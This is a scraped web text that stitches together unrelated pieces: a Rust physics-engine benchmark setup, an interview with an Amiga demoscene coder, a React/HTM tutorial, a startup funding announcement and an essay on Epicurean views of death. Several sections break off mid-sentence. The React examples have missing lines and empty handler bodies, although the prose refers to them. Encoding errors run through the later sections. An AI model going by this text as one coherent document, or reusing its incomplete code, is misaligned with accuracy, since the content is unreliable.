parameters:</p><ul><li><strong>Rust compiler and flags</strong>: <code>rustc 1.46.0-nightly</code>, <code>--release</code>, <code>--features simd-nightly</code>, <code>codegen-units = 1</code>.</li><li><strong>Timestep length</strong>: 0.016 (i.e. 16 milliseconds).</li><li><strong>Number of velocity iterations</strong>: 4 for Rapier, nphysics, and Box2D. 1 for PhysX.</li><li><strong>Number of position iterations</strong>: 1 from Rapier, nphysics, and Box2D. 4 for PhysX.</li><li><strong>Targets</strong>: native CPU (WebAssembly versions and PhysX on GPU have not been benchmarked.)</li><li><strong>Solvers</strong>: variations of PGS. (The PhysX 4.0 TGS solver has not been benchmarked. We used the default <code>ePGS</code> solver.)</li><li><strong>Number of threads</strong>: 1.</li></ul><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></p><p>In this benchmark we don't use multithreading. A benchmark with multithreading enabled, involving only multithread physics
engine will be the subject of another blog post.</p></div><p>Each 3D benchmark is run on two different machines because we observed performance differences between
PhysX and Rapier depending on the processor:</p><ol><li>A desktop computer, running Ubuntu, equipped with an AMD Ryzen 9 3900X CPU, 3.8GHz.</li><li>A MacBook Pro (plugged to a power outlet), running Mac OS, equipped with an Intel Core i7 7920HQ, 3.1GHz.</li></ol><p>The 2D benchmarks are run only on the AMD Ryzen 9 3900X CPU (the relative performance remain the same with
the Inter Core i7 CPU).</p><h3>3D Benchmark: Rapier vs. PhysX vs. nphysics</h3><p>A few notes are in order regarding PhysX in this benchmark. First, we don't use the same number of iterations for Rapier and PhysX.
For Rapier and nphysics we use 4 velocity iterations and 1 position iteration. It is the other way round for PhysX: 1 velocity
iteration and 4 position iterations. This is the most sensible configuration because:</p><ul><li>PhysX developers <a href="http://www.codercorner.com/blog/?p=2072" target="_blank" rel="noopener noreferrer">advise to increase</a> the number of position iterations for
better stability, and leave to 1 the number of velocity iterations.</li><li>PhysX itself (independently from this benchmark) uses 1 velocity iteration and 4 position iterations by default.
It yields more stable simulations than using 4 velocity and 1 position without performance difference.</li><li>Rapier and nphysics use a solver different from PhysX's. With our solver, it is recommended to increase the number of
velocity iterations instead of position iterations, and leave the number of position iterations to 1.</li></ul><p>The PhysX benchmarks will include two performance curves:</p><ol><li>One performance curve using their default <code>ePATH</code> friction model. This is a simplified friction model, faster to
compute, but less realistic. Rapier and nphysics don't implement a similar model yet.</li><li>One performance curve using their <code>eTWO_DIRECTIONAL</code> friction model. This is similar to the friction model used by Rapier
and nphysics.</li></ol><h4>8.000 stacked balls</h4><p>In this benchmark there are 8000 balls falling on a ground also composed of balls. In the end, they form 400
independent small stacks of balls.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<div id="msg_335"><p><strong>Hello Bifat. Could you please introduce yourself to our readers?<br></strong><br>Hi, my name is Timm, I live in Berlin, I started as a member of TEK in 1991 on the Amiga. I did graphics for a few weeks, then I switched my main profession to coding. I left TEK in about 2004 with my then girlfriend Blue to do Playstation 2 demos as Neoscientists. In 2016 I returned to TEK to do demos on the Amiga again. In 2018 I joined K2 as my second group.</p><p><strong>When did you get interested in computers and what was your first computer?<br></strong><br>I got interested in computers because my uncle was a construction engineer, and he had a PET in his office. He used a sort of finite elements method to calculate the hulls of nuclear power plants with it. I was promised to be given the PET when it would be taken out of service. Then the C64 came out and seemed more appropriate. It was some kind of a family effort to finance the C64 very early.</p><p><strong>What Amiga(s) did you have in the past and if you remember, what were the(ir) configuration(s)?<br></strong><br>My first Amiga was an Amiga 500, Kick 1.2, soon with a 1.8mb memory expansion, then I replaced the ROM with Kick 1.3, so I could add an ALF controller and a second-hand 30mb harddisk. In 1990 I got an Amiga 3000, which was extremely expensive. It was an early model shipped with a SuperKickstart disk and very buggy Kick 2.01. Initially it had 6mb RAM, a 210mb SCSI harddisk. This became my main computer for more than 10 years. Over the years Blue and I had about five A3000s altogether, most of them expanded with 68060s, gfx and network cards.</p><p><strong>Do you still have any Amiga(s) today? If yes, which ones and what configuration(s) <br></strong><br>I have an A500, Rev. 5, Kick 1.2, 0,5mb fake fast, 1084s monitor, no other extensions or modifications. This is my machine for final testing of my stuff for "OCS" compliance. I have another A500 with an ACA500+ and an XSurf500 network module. My main computer for coding is an A600 with 2mb of chipmem and a PCMCIA network adapter. Also I have two A3000s, of which one is in regular use. Also I have an A1200, but only for testing my OCS stuff for AGA compatibility. All Amigas except one are in my network, and I use real disk drives and disks on all Amigas.</p><p><strong>Can you tell us how you got involved with the demoscene?<br></strong><br>I lived in a small town in Hesse, Germany. In this town there was an uncanny concentration of early computer scene people. Most of them were two or three years older than me. They founded TEK on the C64. I didn't know them at first. In my own grade there was a very active Amiga guy running a BBS since 1987/88 or so. He supplied me with manuals and tools and so I learned C and assembler and did "serious" programming on the Amiga first. In around 1990 I got to know the other scene people in this town, and being among the more proficient, I got nice support from the others and was well integrated when TEK took off on the Amiga. Also noteworthy is that from the same town our C16/Plus4 section originated, with people who were slightly younger than me.</p><p><strong>Can you tell us a bit about the story behind your group TEK?<br></strong><br>It was founded on the C64 in 1987 by White Knight, Banana, and Mac and possibly a few others, who were all from this town. From White Knight came a part of its name. TEK was more on the creative side of things, known for great music, funny ideas and weird humor. TEK also did cracks and was very active in swapping, and on the C64, the group went into hibernation due to problems with the police, but reappeared shortly thereafter on the Amiga, when I and a few others joined.&nbsp; We brought some new, different attitudes into the group, but Banana's and Mac's punk-like, brazen spirit and humor were still alive and continued to shape the group. With Blue I shared some interesting times, as I introduced her to assembler and demo coding on the Amiga, and when she got it, she asked me to join her making demos on the PS2.</p><p><strong>Do you remember which tools you used back when you started out, and what are you using these days for development?<br></strong><br>Early: Aztec C, Seka, DPaint, AsmOne, Noisetracker, Protracker. Middle ages: DevPac, SAS/C, AsmOne, PPaint, TVPaint, Protracker. Now: Linux, vasm, Lua, PPaint, Protracker, Inkscape, Grafx2. I'm using a toolchain that I mostly wrote myself, plus shell and editor. I use vasm (with a few modifications) for cross-coding, and run the stuff on a real Amiga on fixed addresses using a TCP server. I also wrote a cross cruncher, which later got released as 'Cranker', and I use my own Lua-based macro<br>language 'DemoPHP'. In DemoPHP I can for example calculate tables and do on-the-fly image processing. My workflow is often that I prototype an effect in Lua, which I then slap into an assembler source.</p><p><strong>Do you have some tips for anyone that might want to start doing Amiga productions in 2020?<br></strong><br>Yes. I recommend getting a real Amiga and connect it to the network. Then you can work on the real machine using an assembler like AsmOne, or you can use vasm on a PC and start your work directly from a network share, e.g. using smbfs. Use for example an A500/ACA500+, A600, or an A1200. You can use an emulator as an additional tool, but do not code against it primarily. Don't let yourself get distracted by too much framework stuff, IDE integration and PC side peculiarities, that's<br>beside the point I think.</p><p><strong>What would you consider the best production you worked on and why?<br></strong><br>Elevation, 2016 slideshow. Here everything just worked perfectly. Artistically and technically it fell into place like never before, thanks to Blue (pictures and texts), Blueberry and TTY (help on compression). It was finished literally on the last day.</p><p><strong>Can you tell us what you consider the best Amiga demos back in the golden years? as well as now<br></strong><br>There are too many good, underrated, even mostly forgotten works, not only the usual suspects. To give you an idea: Vector Exterminator, Sound Vision, Absolute Inebriation, Boundless Void... I don't want to name recent productions, because they are too fresh to put labels on them, and it might hurt some people if their productions are not mentioned also. There is not the one and only way of making demos, part of the fun is the multitude of formats and approaches. And by the way, I also appreciate Atari ST/STe demos a lot.</p><p><strong>What do you think of the state of the demo scene today?<br></strong><br>It was in a good shape until the Covid-19 craze, to which most governments reacted in the wrong way. It remains to be seen if we can get back on our feet and what the repercussions are. The parties make little sense without demos, and the demos make little sense without parties. In the long term we are losing people to "getting a life", which is actually an euphemism for something closer to death. But there are also people discovering (or remembering) that making demos and showing them off at international parties might be one of the finest hobbies they'll ever find.</p><p><strong>What do you feel you got out of the whole experience of being active in the Amiga demoscene? for example, did it lead you to code professionally in any way?<br></strong><br>From the demoscene emerged a certain mindset in me as much as I was attracted to it due to this mindset. Optimization and the desire to try impossible things are deeply engrained into my thinking. I hate wasting resources. I like to spend huge amounts of time and work for all sorts of crazy research, but practicability always wins in the end. This was all very helpful in life. I have been working with computers professionally from a young age, and I never really did something I didn't like.</p><p><strong>Is there anyone you would like to send some greetings to? Or perhaps you have some other last words?<br></strong><br>Greetings to all. Thank you for keeping the demoscene alive. This especially goes to the organizers of parties. Your work is appreciated, too.</p><p><strong>That is the end of this interview, thanks for taking the time to do it Bifat, I am sure our readers will appreciate it <img src="https://amigalife.org/Smileys/default/smiley.gif" alt=":)" title="Smiley">.</strong></p></div>

<h2 id="required-knowledge">Required knowledge&nbsp;&nbsp;</h2>
<p>Things you should know before reading this blog post:</p>
<ul>
<li>JavaScript: You should have already written code in that language.</li>
<li>Browser DOM (document object model): It helps if you are loosely familiar with how the DOM represents HTML and how it handles events.</li>
<li>npm: It also helps if you have a basic understanding of the npm package manager for Node.js.</li>
</ul>
<h2 id="about-this-blog-post">About this blog post&nbsp;&nbsp;</h2>
<p>Many tutorials provide comprehensive introductions to the React ecosystem. I wanted to try something different:</p>
<blockquote>
<p>What is the smallest set of libraries that allows you to be productive in React?</p>
</blockquote>
<p>This is an exhaustive list of the npm packages that the code in this blog post depends on:</p>
<ul>
<li><a href="https://www.snowpack.dev/">Build tool <em>Snowpack</em></a>:
<ul>
<li><code>snowpack</code></li>
<li><code>@snowpack/plugin-react-refresh</code></li>
</ul>
</li>
<li><a href="https://reactjs.org/">User interface library <em>React</em></a>:
<ul>
<li><code>react</code></li>
<li><code>react-dom</code></li>
</ul>
</li>
<li><a href="https://github.com/developit/htm">React helper library <em>HTM</em></a> (to specify user interfaces via an HTML-like syntax):
<ul>
<li><code>htm</code></li>
</ul>
</li>
<li><a href="https://immerjs.github.io/immer/docs/introduction">Library <em>Immer</em></a> for non-destructively updating data:
<ul>
<li><code>immer</code></li>
</ul>
</li>
</ul>
<h2 id="the-repository">The repository&nbsp;&nbsp;</h2>
<p>The repository <a href="https://github.com/rauschma/minimal-react"><code>minimal-react</code></a> contains the examples that we are exploring in this blog post:</p>
<ul>
<li>You can try out the examples <a href="https://rauschma.github.io/minimal-react/build/">online</a>.</li>
<li>You can install it locally to play with the complete setup. Everything is installed inside a single directory, so it’s easy to remove later on.</li>
<li>However, installing the repository is not required for following this blog post. All relevant data is quoted inside the post.</li>
</ul>
<p>The repository has the following structure:</p>
<ul>
<li><code>minimal-react/</code>
<ul>
<li><code>html/</code>: HTML files</li>
<li><code>js/</code>: JavaScript code</li>
<li><code>README.md</code>: Instructions for installing and running the project</li>
<li><code>package.json</code>: Configuring the npm package manager</li>
<li><code>snowpack.config.json</code>: Configuring the Snowpack build tool</li>
</ul>
</li>
</ul>
<p><code>package.json</code> specifies the npm packages that the JavaScript code depends on:</p>
<pre><code>"devDependencies": {
  "@snowpack/plugin-react-refresh": "^2.1.0",
  "snowpack": "^2.9.0"
},
"dependencies": {
  "htm": "^3.0.4",
  "immer": "^7.0.7",
  "react": "^16.13.1",
  "react-dom": "^16.13.1"
}
</code></pre>
<p><code>package.json</code> also defines two scripts:</p>
<pre><code>"scripts": {
  "start": "snowpack dev",
  "build": "snowpack build"
},
</code></pre>
<p>These are executed via:</p>
<ul>
<li>Starting the development web server: <code>npm run start</code>
<ul>
<li>Abbreviated: <code>npm start</code></li>
</ul>
</li>
<li>Creating a standalone application (that runs without the development server): <code>npm run build</code></li>
</ul>
<h2 id="what-is-react%3F">What is React?&nbsp;&nbsp;</h2>
<p>React is a library for creating user interfaces in web browsers. Before we take a look at how it works, let us remind ourselves how user interfaces are created if they are based on a traditional model-view-controller approach.</p>
<h3 id="the-traditional-model-view-controller-(mvc)-approach">The traditional model-view-controller (MVC) approach&nbsp;&nbsp;</h3>
<p>This object-oriented approach gets its name from three roles that objects play in it:</p>
<ul>
<li>The <em>model</em> is the data to be accessed via the graphical user interface.</li>
<li>The <em>view</em> displays the model.</li>
<li>The <em>controller</em> reacts to <em>events</em> (actions by the user) and updates model and view accordingly.</li>
</ul>
<p>Traditional MVC-based user interfaces work as follows:</p>
<ul>
<li>A tree of user interface components is created once.</li>
<li>Each user interface component manages its own state and updates it incrementally, in response to user interactions.</li>
<li>So-called “glue code”&nbsp;propagates state changes across UI components.</li>
</ul>
<p>This approach has downsides:</p>
<ul>
<li>The user interface logic is often scattered across the code.</li>
<li>Cross-component changes are difficult to implement.</li>
<li>It’s easy to introduce inconsistencies because there can be many different combinations of states.</li>
</ul>
<h3 id="react">React&nbsp;&nbsp;</h3>
<p>React works differently:</p>
<ul>
<li>The user interface is encoded as a tree-shaped data structure. It is called <em>virtual DOM</em> because it is similar to the <em>document object model (DOM)</em> used by browsers to represent HTML.</li>
<li>There is a single (nested) model for the complete user interface.</li>
<li>A user interface component is simply a function that maps a model to a user interface.
<ul>
<li>The root component has as input the whole model and passes on parts of that model to subcomponents (which are also functions).</li>
</ul>
</li>
<li>When the user interacts with the UI, the model is changed accordingly and the complete user interface is recreated (by invoking the root component again).
<ul>
<li>To make this viable, performance-wise, React compares the virtual DOM returned by the root component with the current browser DOM. It only changes the latter where the former differs.</li>
</ul>
</li>
</ul>
<p>Benefits of this approach:</p>
<ul>
<li>It’s easier to understand the user interface logic.</li>
<li>Cross-component dependencies are easier to implement.</li>
<li>The data flow is simpler: always from the top of the user interface component tree to its bottom.</li>
</ul>
<h2 id="first-example%3A-counting-clicks">First example: counting clicks&nbsp;&nbsp;</h2>
<p>The first example is in the file <code>minimal-react/html/counting-clicks.html</code>.</p>
<h3 id="adding-the-user-interface-to-the-html-page">Adding the user interface to the HTML page&nbsp;&nbsp;</h3>
<p>This is the body of the HTML page:</p>
<pre><code><span>&lt;<span>h1</span>&gt;</span>Counting clicks<span>&lt;/<span>h1</span>&gt;</span>
<span>&lt;<span>div</span> <span>id</span>=<span>"root"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
<span>&lt;<span>script</span> <span>type</span>=<span>"module"</span> <span>src</span>=<span>"../js/counting-clicks.js"</span>&gt;</span><span>&lt;/<span>script</span>&gt;</span>
</code></pre>
<p>This is how <code>minimal-react/js/counting-clicks.js</code> adds its user interface to the web page:</p>
<pre><code><span>import</span> ReactDOM <span>from</span> <span>'react-dom'</span>;
<span>import</span> {html} <span>from</span> <span>'htm/react'</span>;
<span>import</span> {useState} <span>from</span> <span>'react'</span>;



ReactDOM.render(
  html<span>`&lt;<span>${CountingClicks}</span> rootModel=<span>${rootModel}</span> /&gt;`</span>, 
  <span>document</span>.getElementById(<span>'root'</span>)); 
</code></pre>
<ul>
<li>Line A is how we create user interface elements (via the virtual DOM). Read on for more information.</li>
<li>Line B is the HTML element in which React creates the user interface.</li>
</ul>
<h3 id="creating-user-interface-elements">Creating user interface elements&nbsp;&nbsp;</h3>
<p>Consider the following syntax from the previous example:</p>
<pre><code>html<span>`&lt;<span>${CountingClicks}</span> rootModel=<span>${rootModel}</span> /&gt;`</span>
</code></pre>
<p>There are two layers to this syntax.</p>
<h4 id="syntactic-layer-1%3A-tagged-templates">Syntactic layer 1: tagged templates&nbsp;&nbsp;</h4>
<p><code>html`···`</code> is a <a href="https://exploringjs.com/impatient-js/ch_template-literals.html#tagged-templates"><em>tagged template</em></a>. Tagged templates are a JavaScript language feature that lets us embed foreign syntax in JavaScript code. Each tagged template is actually a function call – for example:</p>
<pre><code><span>const</span> numberOfFruits = <span>4</span>;
<span>const</span> nameOfFruits = <span>'strawberries'</span>;
<span>const</span> result = someFunc<span>`I have <span>${numberOfFruits}</span> <span>${nameOfFruits}</span>!`</span>;
</code></pre>
<p>The the last line is equivalent to:</p>
<pre><code><span>const</span> result = someFunc([<span>'I have '</span>, <span>' '</span>, <span>'!'</span>], numberOfFruits, nameOfFruits);
</code></pre>
<p>Tag functions such as <code>someFunc()</code> can return arbitrary values and are usually guided by their input. In this case, the input is:</p>
<ul>
<li>The <em>template strings</em> <code>['I have ', ' ', '!']</code> are static (the same each time this particular function call is made)</li>
<li>The <em>substitutions</em> <code>numberOfFruits</code> and <code>nameOfFruits</code> are dynamic (possibly different each time this particular function call is made)</li>
</ul>
<p>Substitutions are inserted “into” the template via the syntax <code>${···}</code>.</p>
<p>The <em>tag function</em> <code>html</code> supports React’s syntax for creating virtual DOM elements. It parses its input to produce its output.</p>
<h4 id="syntactic-layer-2%3A-jsx%2C-react%E2%80%99s-syntax-for-creating-virtual-dom-elements">Syntactic layer 2: JSX, React’s syntax for creating virtual DOM elements&nbsp;&nbsp;</h4>
<p><em>JSX</em> is a non-standard JavaScript language feature introduced by React. It lets us use HTML-ish expressions to create virtual DOM data. JSX must be compiled to standard JavaScript and is supported by several compilers – for example:</p>
<ul>
<li><a href="https://babeljs.io/">Babel</a>:
<ul>
<li>Input: modern and/or future JavaScript</li>
<li>Output: current or older JavaScript</li>
</ul>
</li>
<li><a href="https://www.typescriptlang.org/">TypeScript</a>:
<ul>
<li>Input: JavaScript plus static type information (roughly, a superset of JavaScript)</li>
<li>Output: current or older JavaScript</li>
</ul>
</li>
</ul>
<p>In this tutorial, we use a tagged template instead of JSX, which has the benefit that we can use plain JavaScript (no compilation is necessary). There are only minor differences between <code>html</code> syntax and JSX, which is why I’ll occasionally use the name JSX for the former.</p>
<p>There are two kinds of elements.</p>
<h5 id="react-components">React components&nbsp;&nbsp;</h5>
<p>First, the name of an element can be a function whose name starts with an uppercase letter:</p>
<pre><code>html<span>`&lt;<span>${UiComponent}</span> arg1="abc" arg2=<span>${<span>123</span>}</span> /&gt;`</span>
</code></pre>
<p>This expression is equivalent to:</p>
<pre><code>React.createElement(UiComponent, { <span>arg1</span>: <span>"abc"</span>, <span>arg2</span>: <span>123</span> })
</code></pre>
<p>In this case, <code>React.createElement()</code> makes the following function call:</p>
<pre><code>UiComponent({ <span>arg1</span>: <span>"abc"</span>, <span>arg2</span>: <span>123</span> })
</code></pre>
<h5 id="virtual-dom-elements">Virtual DOM elements&nbsp;&nbsp;</h5>
<p>Second, the name of an element can also be a string that starts with a lowercase letter:</p>
<pre><code>html<span>`&lt;div arg1="abc" arg2=<span>${<span>123</span>}</span> /&gt;`</span>
</code></pre>
<p>This expression is equivalent to:</p>
<pre><code>React.createElement(<span>"div"</span>, { <span>arg1</span>: <span>"abc"</span>, <span>arg2</span>: <span>123</span> })
</code></pre>
<p>In this case, <code>React.createElement()</code> directly creates virtual DOM data.</p>
<h4 id="jsx-in-action">JSX in action&nbsp;&nbsp;</h4>
<p>Let’s go back to the initial code:</p>
<pre><code>html<span>`&lt;<span>${CountingClicks}</span> rootModel=<span>${rootModel}</span> /&gt;`</span>
</code></pre>
<p>What is happening here?</p>
<p>We are invoking the component <code>CountingClicks</code> (a function) and pass it a single parameter, whose label is <code>rootModel</code>. This is what the root model looks like:</p>
<pre><code><span>const</span> rootModel = {
  <span>numberOfClicks</span>: <span>0</span>,
};
</code></pre>
<h3 id="the-component-countingclicks()">The component <code>CountingClicks()</code>&nbsp;&nbsp;</h3>
<p>The component is implemented as follows:</p>
<pre><code><span><span>function</span> <span>CountingClicks</span>(<span>{rootModel: initialRootModel}</span>) </span>{
  <span>const</span> [rootModel, setRootModel] = useState(initialRootModel); 
  <span>return</span> html<span>`
    &lt;div&gt;
      &lt;a href="" onClick=<span>${handleIncrement}</span>&gt;
        Number of clicks: <span>${rootModel.numberOfClicks}</span>&lt;/a&gt;
      &lt;p /&gt;
      &lt;button onClick=<span>${handleReset}</span>&gt;Reset&lt;/button&gt;
    &lt;/div&gt;
  `</span>;

  <span><span>function</span> <span>handleIncrement</span>(<span>event</span>) </span>{
    
  }
  <span><span>function</span> <span>handleReset</span>(<span>event</span>) </span>{
    
  }
}
</code></pre>
<p>The component returns a single virtual DOM element, a <code>&lt;div&gt;</code>. We use the <code>${···}</code> syntax to insert values into the returned data:</p>
<ul>
<li>The click event handler <code>handleIncrement</code></li>
<li>The number <code>rootModel.numberOfClicks</code></li>
<li>The click event handler <code>handleReset</code></li>
</ul>
<h4 id="handling-state-via-the-usestate-hook">Handling state via the <code>useState</code> hook&nbsp;&nbsp;</h4>
<p>The function call <code>useState()</code> in line A adds <em>reactivity</em> to our code:</p>
<ul>
<li><code>rootModel</code> is the current model data (the M in MVC).</li>
<li><code>initialRootModel</code> is the initial value of <code>rootModel</code>.</li>
<li><code>setRootModel</code> can be used to change <code>rootModel</code>. Whenever we do that, React automatically reruns the <code>Coun…</code></li></ul></div></div>

August 25, 2020 | https://tipe.io/blog/tipe-raises-seed | <a href="https://web.archive.org/web/*/https://tipe.io/blog/tipe-raises-seed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Today we're excited to announce that tipe has raised $2.1m in seed funding led by CRV and joined by investors YC, M Ventures, and Precursor Ventures. This investment will help tipe deliver an excellent experience for developers and teams who need a better workflow for managing content. Since graduating from YC's Winter 18 batch, we've been building prototypes, talking with users, and learning from the community. We're finally ready to show everyone what we've learned.  </p><p>Teams are shifting away from legacy site builders to more sophisticated builds with frameworks like Next.js and Gatsby. Cloud computing, crawlers, and JavaScript have all approved and come together to enable this shift. Jamstack offers so many benefits for low effort but also introduces more decision making. Teams must now decide on a content workflow, and developers are on the hook to figure it out.</p><p>We want to make this decision easy for developers. </p><h2>Make it your own, together</h2><p>They always say, "...never build a CMS". We know every team has different needs and use cases when it comes to content workflows. Customization and extendability are at the core of tipe's design.  That's why tipe is open-source and has a simple plugin features that make it easy for you to create your own CMS.</p><p>We invest in the open-source community and all the efforts to create and maintain the fantastic projects leading the Jamstack wave. We encourage developers to use plugins and extensions for tipe created by the community. One of our goals is to make sure we're not another app devs have to maintain, so we'll be working with developers to make sure working with tipe stays lean and fast. </p><p>We can't do this alone, so today we're launching the <a href="https://join.slack.com/t/tipe-hq/shared_invite/zt-gfesfzxf-9KHj1Q3GPhUbUOa6PjNpTA">tipe community slack</a>ðŸŽ‰. You can interact with the tipe team more closely, see what the community is cooking up, or even get help for anything that comes up. </p><h2>Roadmap to the best experience</h2><p>Developer and user experience are our main focuses here at tipe. As we grow, we want to move towards a minimal and straightforward product to use but powerful when combined with plugins and extensions. To achieve this goal, we plan on maintaining transparency about the direction of tipe and what's coming next. We'll also be leaning on our users and the community to help us build something that they would love. </p><p>To start, we have support for Jamstack frameworks like Next.js and Gatsby, a CLI to get started without ever visiting our web app, and SDKs to query content. As the community grows and improves tooling, we'll support all that comes from it. Open-source is are core, well before tipe, and will remain that way as we grow. </p><h2>Perfect timing</h2><p>The web is transitioning into another era with all the moving pieces seeing significant enhancements. Now is the time to build a fast experience for your users. You can't do that if your team is slow, because of content changes or any reason.</p><p>We look forward to helping teams stay fast as they deliver amazing journeys for their users. Also, <a href="https://tipe.io/jobs">we're hiring</a>! If anything you read here resonates with you, we'd love to hear from you. </p></div></div></div>]]>

Thankfully, for most of us, this frightful fact usually hovers somewhere beyond the margins of our consciousness: weâ€™re â€˜awareâ€™ of our death without constantly fearing it.</p>
<p>Inevitably, though, there are moments when the reality of our eventual death strikes us in a new, chillier light. A close call demonstrates the tenuousness of life, or the death of a loved one reminds us that no one is exempt from humanityâ€™s ultimate destination. Even talking about death, as we are now, can be enough to bring on a ruminative contemplation of the end, and with it a shudder of fear about oneâ€™s own extinguishment.</p>
<p>In these moments, when your pending dissipation presents itself afresh, the fact of death is <em>experienced</em> in a new way. Rather than merely being â€˜knownâ€™ like one more quotidian statement about the world â€“ â€˜The sky is blue. I will dieâ€™ â€“ the sense of oneâ€™s ending is felt more deeply and more immediately. In these moods, the terror of death seeps into your awareness of yourself as a person; its awesome inevitability and finality makes you feel small and powerless. This is the fear of death at an existential level, brought on by the almost unthinkable notion that there is and only ever will be one of you â€“ and sooner or later it will flicker out of existence, leaving little more than memories in other soon-to-be-gone beings. The fear of death as Iâ€™m discussing it here is not about the practical worry of who will pay off your credit card debt after youâ€™re gone: itâ€™s about the unsettling fact that the person who earned that debt in the first place is but a fleeting speck of an event in the infinite history of the Universe.</p>
<p>The fear of death is also heightened by thinking about how harmful mortality is to us â€“ how there is no greater blow in life than for life to cease. As the philosopher Thomas Nagel observed, death is the great deprivation. There is always more life to be lived, and it is painful to have that taken away. The best way to get at this fear, perhaps, is to contemplate the almost unbearable thought of your future absence: one day, at family dinners, a place will no longer be set for you. The day after you die, the newspaper will still be published just as it was the day before. And the morning after your funeral, friends will make their morning coffee. You will be gone for good, though, and that certainly is a terrifying impediment.</p>
<p>So the fear of death is awful to behold â€“ and therefore, naturally, something to overcome. Indeed, the striving to overcome the fear of death, I would suggest, has stimulated a great deal of thinking over the course of humanityâ€™s time on Earth: one could go so far as to say that working out how to thwart, or perhaps accommodate, death sits at the root of a vast number of cultural achievements. The fear of finitude is a powerful propellant.</p>
<p>So how <em>can</em> the fear of death be overcome? One popular strategy is to plan for a sequel to life, which, itâ€™s usually expected, will take place in another, happier realm. Resurrection, whether as a human or otherwise, has won a great many adherents. And there have been several religions, as well as philosophers, that have promulgated a view of time as cyclical: weâ€™ve done this before, and weâ€™ll do this again. Death as a mere interlude.</p>
<p>These tactics and ideas have something to recommend them, certainly. But for now, letâ€™s set aside all possibility of life after death so that we are left with the often horrifying thought: you exist, but one day you wonâ€™t. Are there any good philosophical reasons not to fear that gulf â€“ between being and not-being? In this Guide, I will suggest several philosophically inspired reasons not to be fearful of your own death â€“ and so, in that sense, I hope that there is something helpful here to lighten the weight of the deeply unsettling existential state in which we are all lucky enough to find ourselves.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>The life of the city-dwelling Ancient Greek philosopher Epicurus straddled the 3rd and 4th centuries BCE. His philosophy nowadays is popularly packaged as a kind of light hedonism: sensualist, joyful, a hint of luxury, a naughty second glass of wine. Though Epicurus himself was probably not quite the blinkered and unimaginative pleasure-seeker that these clichÃ©s suggest, they do give a flavour of his outlook.</p>
<p>For him, the purpose of human life is to achieve happiness. Epicurus construed this as an absence of pain rather than a positive programme of indulging oneself by, say, keeping up a rigorous schedule of orgies or downing flasks of opium on Tuesday mornings. He recognised that whatever temporary excitement such pursuits yield in the moment will probably be well counterbalanced by a severe price to pay later on. So instead, Epicurus recommended (somewhat disappointingly) that it is <em>moderation</em> that will lead to a release from pain and suffering, which in turn will bring a respectable measure of happiness and therefore a good life. Our limitations, our meagre certainties, are at the centre of Epicurusâ€™ system of thought, and it is in this context of mitigating pain and accruing a gentle happiness that he believed the fear of death needs to be understood. Epicurus and his followers held that the fear of death is harmful to the enjoyment of our lives, and so showing why this fear isnâ€™t well-founded contributes to the overall hedonic project of living well.</p>
<p>According to this tradition, the first thing to do to overcome the fear of death is to try to articulate to yourself what it would be like to <em>be</em> dead. Imagine <em>yourself</em>, but rather than alive â€“ dead. (Remember, weâ€™ve cast aside the afterlife.) As youâ€™ll swiftly appreciate, there is an intractable contradiction right at the centre of this first actionable item. You cannot imagine what it would be like to be dead, because death is an absence of existence. There is, literally, nothing to imagine â€“ because nothingness itself cannot be imagined. There is no perspective, no view from nothingness, nothing to which it can be approximated. So that is the first recommendation: realise that being dead isnâ€™t an experience. Death itself isnâ€™t really a <em>thing</em> at all. In Epicurusâ€™ words: â€˜Death is nothing to us.â€™</p>
<p>To drive the point home, letâ€™s turn to the Roman poet Lucretius. He was a saltier and more ironic Epicurean of a later generation, the 1st century BCE, whose unexampled poem <em>On the Nature of Things</em> fell afoul of early Christians because of its crypto-atheism. In the poem, Lucretius proposes an idea, later termed the â€˜Symmetry Argumentâ€™, that hints at the second thing you should do to overcome the fear of death: try to recall what it was like before you were born. Not how the world was, which is the task of historical imagination, but what it was like to <em>be</em> you â€“ before you were created. Youâ€™ll discover that prenatal existence isnâ€™t something that can be thought about, much less experienced. The symmetrical part of the argument, of course, is that you have the very same difficulty in imagining what it is like to be dead. Indeed, according to Lucretius, you-pre-existence is the same thing as death or post-existence: both involve the absence of you. No doubt you donâ€™t fear your prenatal existence and logically speaking, given their equivalence, it follows that you should fear death the exact same amount, as in not at all. (As the novelist Vladimir Nabokov put it in his memoirs: â€˜common sense tells us that our existence is but a brief crack of light between two eternities of darkness.â€™)</p>
<p>This brings us to the third thing to do to calm your existential angst: examine how much â€˜nothingâ€™ â€“ nonexistence â€“ can reasonably be feared. That is, are there any good reasons for your pending death to trigger the emotion of fear? It is reasonable to be fearful of things to the extent that those things can cause you harm. It was reasonable to be jittery about nukes during the Cold War era; it is reasonable to be scared that humanity is turning the globe into a sauna; and it is reasonable for your heart to launch as from a trebuchet into your throat when your partner says to you the words â€˜We need to talk.â€™ These are all identifiable threats that foretell awful experiences. None of them would help us in our Epicurean goal of being happy, and so are reasonably feared.</p>
